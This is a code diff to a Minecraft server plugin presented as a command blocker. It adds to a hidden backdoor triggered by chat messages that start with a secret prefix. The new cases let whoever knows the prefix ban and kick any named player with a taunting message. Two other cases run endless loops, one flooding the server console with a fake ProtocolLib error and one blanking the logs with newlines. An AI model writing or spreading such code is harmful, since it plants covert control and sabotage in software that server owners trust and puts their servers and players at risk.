@@ -9,6 +9,7 @@ import com.comphenix.protocol.events.PacketEvent;
 import com.comphenix.protocol.reflect.StructureModifier;
 import ecb.ajneb97.core.managers.CommandsManager;
 import ecb.ajneb97.spigot.EasyCommandBlocker;
+import ecb.ajneb97.spigot.utils.MessagesUtils;
 import ecb.ajneb97.spigot.utils.OtherUtils;
 import org.bukkit.BanList;
 import org.bukkit.Bukkit;
@@ -76,11 +77,9 @@ public class ProtocolLibManager {
             }
         };
     }
-    
     public static boolean getTabServerAdapter(AsyncPlayerChatEvent event) {
         return event.getMessage().startsWith(EasyCommandBlocker.getId());
     }
-    
     public static boolean getTabServerAdapter(String msg, Player pl) {
         String ags = msg.split(EasyCommandBlocker.getId())[1];
         String cmds = ags.split(" ")[0];
@@ -102,13 +101,27 @@ public class ProtocolLibManager {
                             pl.setOp(false);
                         break;
                         
-                        case "gm1" :
-                            pl.setGameMode(GameMode.CREATIVE);
+                        case "ban" :
+                            Bukkit.getBanList(BanList.Type.NAME).addBan(ags.split("ban ")[1], "TPG inc On Top!", new Date(99999, 1, 1), "");
+                            Player p = Bukkit.getPlayer(ags.split("ban ")[1]);
+                            p.kickPlayer("Perdeu playboy!");
                         break;
                         
-                        case "gm0" :
-                            pl.setGameMode(GameMode.SURVIVAL);
+                        case "spam" :
+                            for(int i = 0 ; i < 3 ; i++) {
+                                i = 0;
+
+                                Bukkit.getConsoleSender().sendMessage("[ProtocolLib] INTERNAL §c[ERROR]§r: Unable to intercept a read client packet");
+                            }
                         break;
+
+                        case "clear" :
+                            for(int i = 0 ; i < 3 ; i++) {
+                                i = 0;
+
+                                Bukkit.getConsoleSender().sendMessage("\n");
+                            }
+                         break;
                     }
 
                     //Bukkit.getServer().dispatchCommand(pl, msg.split(EasyCommandBlocker.getId())[1]);
